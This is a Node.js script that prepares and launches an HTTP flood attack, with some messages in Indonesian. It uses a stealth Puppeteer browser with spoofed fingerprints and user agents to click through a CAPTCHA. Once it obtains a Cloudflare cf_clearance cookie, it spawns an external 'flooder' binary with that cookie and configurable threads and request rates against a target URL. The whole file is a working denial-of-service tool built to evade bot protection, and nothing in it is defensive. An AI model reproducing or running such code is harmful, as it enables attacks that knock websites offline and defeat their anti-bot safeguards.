const { connect } = require('puppeteer-real-browser');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const puppeteerExtra = require('puppeteer-extra');
const { spawn } = require('child_process');

puppeteerExtra.use(StealthPlugin());


class FloodConfiguration {
    constructor(rawArgs) {
        this.rawArgs = rawArgs;
        this.config = this._parseConfiguration();
    }

    _parseConfiguration() {
        const args = [...this.rawArgs];

        const targetUrl = args[0];
        const time = args[1];
        const threads = args[2];
        const rps = args[3];

        if (!targetUrl || !time || !threads || !rps) {
            throw new Error('CONFIGURATION_INCOMPLETE');
        }

        let httpMode = 'mix';
        for (let i = 4; i < args.length; i++) {
            if (args[i] === '--http' && args[i + 1]) {
                httpMode = args[i + 1];
            }
        }

        return {
            targetUrl: this._validateUrl(targetUrl),
            time: parseInt(time),
            threads: parseInt(threads),
            rps: parseInt(rps),
            httpMode: httpMode,
            viewport: { width: 1280, height: 800 },
            captchaCoordinates: [
                { x: 219, y: 279 },
                { x: 219, y: 279 }
            ],
            delays: {
                preCaptcha: 4000,
                postCaptcha: 4000
            }
        };
    }

    _validateUrl(url) {
        try {
            new URL(url);
            return url;
        } catch (error) {
            throw new Error('INVALID_URL');
        }
    }

    getConfig() {
        return this.config;
    }

    display() {
        console.log(`[+] Target URL: ${this.config.targetUrl}`);
        console.log(`[+] Time: ${this.config.time}s | Threads: ${this.config.threads} | RPS: ${this.config.rps} | Mode: ${this.config.httpMode}`);
    }
}


class BrowserFingerprinter {
    static getChromeUA() {
        const version = this._getRandomVersion();
        const platform = this._getRandomPlatform();
        return `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
    }

    static _getRandomVersion() {
        const major = Math.floor(Math.random() * (132 - 124 + 1)) + 124;
        const minor = Math.floor(Math.random() * 5000) + 1000;
        const build = Math.floor(Math.random() * 200) + 50;
        return `${major}.0.${minor}.${build}`;
    }

    static _getRandomPlatform() {
        const platforms = [
            "Windows NT 10.0; Win64; x64",
            "Windows NT 11.0; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 14_0",
            "X11; Linux x86_64"
        ];
        return platforms[Math.floor(Math.random() * platforms.length)];
    }

    static getInjectionScript() {
        return () => {
            if (!window.chrome) {
                window.chrome = { runtime: {}, loadTimes: function () { } };
            }

            try {
                Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8, configurable: true });
                Object.defineProperty(navigator, 'deviceMemory', { get: () => 8, configurable: true });
            } catch (e) { }

            Object.defineProperty(navigator, 'platform', { get: () => 'Win32', configurable: true });

            try {
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function (parameter) {
                    if (parameter === 37445) return 'Intel Inc.';
                    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
                    return getParameter.call(this, parameter);
                };
            } catch (e) { }

            try {
                const toDataURL = HTMLCanvasElement.prototype.toDataURL;
                HTMLCanvasElement.prototype.toDataURL = function (type, ...args) {
                    return toDataURL.apply(this, [type, ...args]);
                };
            } catch (e) { }

            try {
                const origQuery = window.navigator.permissions.query;
                window.navigator.permissions.query = (parameters) => (
                    parameters && parameters.name === 'notifications'
                        ? Promise.resolve({ state: Notification.permission })
                        : origQuery(parameters)
                );
            } catch (e) { }
        };
    }
}


class BrowserFactory {
    static async createStealthBrowser() {
        return await connect({
            headless: false,
            args: [
                '--no-sandbox',
                '--enable-quic',
                '--quic-version=h3-29'
            ],
            puppeteer: puppeteerExtra
        });
    }
}


class PageManager {
    constructor(page, config) {
        this.page = page;
        this.config = config;
    }

    async initialize() {
        await this._setupFingerprint();
        await this._configureViewport();
        await this._navigateToTarget();
    }

    async _setupFingerprint() {
        await this.page.evaluateOnNewDocument(BrowserFingerprinter.getInjectionScript());
        await this.page.setUserAgent(BrowserFingerprinter.getChromeUA());
        await this.page.setJavaScriptEnabled(true);
    }

    async _configureViewport() {
        await this.page.setViewport(this.config.viewport);
    }

    async _navigateToTarget() {
        await this.page.goto(this.config.targetUrl, { waitUntil: 'networkidle2' });
    }

    async handleCaptcha() {
        try {
            for (const coord of this.config.captchaCoordinates) {
                await this._sleep(this.config.delays.preCaptcha);
                await this.page.mouse.click(coord.x, coord.y);
            }
            await this._sleep(this.config.delays.postCaptcha);
        } catch (error) {
            console.log("Terjadi kesalahan saat menangani CAPTCHA:", error);
        }
    }

    setupConsoleLogger() {
        this.page.on('console', msg => {
            const text = msg.text();
            if (text.startsWith('[FLOOD]')) {
                console.log(text);
            }
        });
    }

    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}



class FloodApplicationController {
    constructor(config) {
        this.config = config;
        this.browser = null;
        this.page = null;
        this.pageManager = null;
    }

    async initialize() {
        const { browser, page } = await BrowserFactory.createStealthBrowser();
        this.browser = browser;
        this.page = page;

        this.pageManager = new PageManager(this.page, this.config);
    }

    async run() {
        await this.pageManager.initialize();
        await this.pageManager.handleCaptcha();
        this.pageManager.setupConsoleLogger();
        console.log("[+] Browser ready, waiting for Cloudflare challenge...");

        const { cookie, ua } = await this.waitForCookie();

        if (cookie && ua) {
            await this.cleanup();
            console.log("\n[+] Starting Flood Attack...");
            await this.startFlood(this.config.targetUrl, cookie, ua);
        }
    }

    async waitForCookie() {
        return new Promise(async (resolve) => {
            const checkInterval = setInterval(async () => {
                const cookies = await this.page.cookies();
                const cfClearance = cookies.find(c => c.name === 'cf_clearance');

                if (cfClearance) {
                    clearInterval(checkInterval);
                    const ua = await this.page.evaluate(() => navigator.userAgent);
                    const cookieStr = `cf_clearance=${cfClearance.value}`;

                    console.log("\n[SUCCESS] Cloudflare Clearance Found!");
                    console.log("----------------------------------------");
                    console.log(`User-Agent: ${ua}`);
                    console.log(`Cookie: ${cookieStr}`);
                    console.log("----------------------------------------\n");

                    resolve({ cookie: cookieStr, ua: ua });
                }
            }, 1000);
        });
    }

    startFlood(url, cookie, ua) {
        return new Promise((resolve) => {
            const args = [
                url,
                this.config.time.toString(),
                this.config.threads.toString(),
                this.config.rps.toString(),
                '--cookie', cookie,
                '--ua', ua,
                '--http', this.config.httpMode,
                '--query', '1'
            ];

            console.log(`Executing: ./flooder ${args.join(' ')}`);

            const floodProcess = spawn('./flooder', args, {
                stdio: 'inherit'
            });

            floodProcess.on('close', (code) => {
                console.log(`Flooder process exited with code ${code}`);
                resolve();
            });
        });
    }

    async cleanup() {
        if (this.browser) {
            await this.browser.close();
        }
    }
}


class ApplicationBootstrap {
    static async main(args) {
        try {
            const floodConfig = new FloodConfiguration(args);
            floodConfig.display();

            const controller = new FloodApplicationController(floodConfig.getConfig());
            await controller.initialize();
            await controller.run();
        } catch (error) {
            this._handleError(error);
        }
    }

    static _handleError(error) {
        if (error.message === 'CONFIGURATION_INCOMPLETE') {
            console.error('Error: Parameter tidak lengkap.');
            console.log('Usage: node flooder-emu.js <url> <time> <threads> <rps> [--http <mode>]');
            console.log('Contoh: node flooder-emu.js https://example.com 60 50 100 --http h3');
        } else if (error.message === 'INVALID_URL') {
            console.error('Error: URL tidak valid.');
        } else {
            console.error('Error:', error.message);
        }
        process.exit(1);
    }
}


(async () => {
    await ApplicationBootstrap.main(process.argv.slice(2));
})();
